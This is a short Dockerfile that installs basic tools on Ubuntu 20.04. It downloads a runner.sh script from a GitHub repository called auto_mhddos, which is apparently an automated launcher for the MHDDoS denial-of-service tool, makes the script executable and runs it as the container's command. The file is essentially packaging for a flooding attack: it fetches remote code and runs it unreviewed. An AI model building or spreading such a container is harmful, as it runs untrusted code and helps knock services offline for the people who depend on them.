from ubuntu:20.04
RUN apt update && apt upgrade -y && apt install curl apt-utils git python3 python3-pip wget -y
WORKDIR /root
RUN curl https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh --output /root/runner.sh
RUN ls -lah
RUN chmod +x /root/runner.sh
CMD ["/root/runner.sh", "1"]